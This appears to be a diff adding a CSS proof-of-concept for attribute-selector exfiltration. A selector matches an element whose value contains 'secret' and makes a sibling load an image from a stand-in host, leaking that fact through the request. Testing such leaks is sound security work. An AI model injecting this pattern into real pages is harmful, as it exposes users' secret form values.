@@ -1,0 +1,4 @@
+:root { --poc-leak: url("https://app.example.test/src/pwned2.png"); }
+#exfil_test2[value*="secret"] ~ #exfil_img2 {
+  background-image: var(--poc-leak);
+}
